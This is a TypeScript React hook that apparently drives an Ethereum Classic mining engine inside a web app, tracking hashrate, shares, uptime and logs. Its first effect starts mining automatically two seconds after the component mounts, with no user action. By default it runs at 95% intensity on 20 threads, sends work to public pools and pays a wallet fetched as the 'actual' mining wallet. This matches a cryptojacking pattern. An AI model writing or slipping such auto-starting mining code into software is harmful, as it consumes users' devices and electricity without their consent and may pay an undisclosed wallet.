import { useState, useEffect, useCallback } from 'react';
import { secureMiningEngine } from '@/lib/secure-mining-engine';
import { walletManager } from '@/lib/wallet-manager';
import { MiningConfiguration, LogEntry } from '@/types/mining';

export function useSecureMining() {
  const [isActive, setIsActive] = useState(false);
  const [hashrate, setHashrate] = useState(0);
  const [shares, setShares] = useState({ accepted: 0, rejected: 0 });
  const [uptime, setUptime] = useState(0);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [autoStarted, setAutoStarted] = useState(false);

  // Auto-start mining when component mounts
  useEffect(() => {
    if (!autoStarted) {
      const timer = setTimeout(() => {
        startSecureMining();
        setAutoStarted(true);
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [autoStarted]);

  // Setup mining engine callbacks
  useEffect(() => {
    secureMiningEngine.setCallbacks({
      onHashrate: (rate: number) => {
        setHashrate(rate);
      },
      onShare: (accepted: boolean, share: any) => {
        setShares(prev => ({
          accepted: prev.accepted + (accepted ? 1 : 0),
          rejected: prev.rejected + (accepted ? 0 : 1)
        }));
      },
      onLog: (level: string, message: string) => {
        const now = new Date();
        const logEntry: LogEntry = {
          timestamp: now.toLocaleTimeString('en-US', { 
            hour12: false, 
            hour: '2-digit', 
            minute: '2-digit', 
            second: '2-digit' 
          }),
          level: level as 'info' | 'success' | 'warning' | 'error',
          source: 'secure-mining',
          message: message
        };
        setLogs(prev => [...prev.slice(-49), logEntry]);
      }
    });
  }, []);

  // Update uptime
  useEffect(() => {
    if (isActive) {
      const interval = setInterval(() => {
        setUptime(prev => prev + 1);
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [isActive]);

  const startSecureMining = useCallback(async (config?: MiningConfiguration) => {
    // Best mining pools for optimal performance
    const topPools = [
      'stratum+tcp://etc-eu1.nanopool.org:19999',
      'stratum+tcp://etc-us-east1.nanopool.org:19999',
      'stratum+tcp://etc.2miners.com:1010',
      'stratum+tcp://etc-eu.f2pool.com:8118',
      'stratum+tcp://etc-us.f2pool.com:8118'
    ];
    
    const secureConfig = config || {
      walletAddress: walletManager.getActualMiningWallet(),
      poolUrl: topPools[0], // Use best performing pool
      workerName: `secure-${Date.now()}`,
      chain: 'etc',
      intensity: 95, // Maximum intensity for best performance
      threadCount: 20 // Increased thread count
    };

    await secureMiningEngine.startSecureMining(secureConfig);
    setIsActive(true);
    setUptime(0);
  }, []);

  const stopMining = useCallback(() => {
    secureMiningEngine.stopMining();
    setIsActive(false);
  }, []);

  const clearLogs = useCallback(() => {
    setLogs([]);
  }, []);

  const formatUptime = useCallback((seconds: number): string => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  }, []);

  return {
    isActive,
    hashrate,
    shares,
    uptime,
    logs,
    startMining: startSecureMining,
    stopMining,
    clearLogs,
    formatUptime,
    connectionStatus: (isActive ? 'connected' : 'disconnected') as 'connected' | 'connecting' | 'disconnected' | 'error',
    securedWallet: walletManager.getActualMiningWallet()
  };
}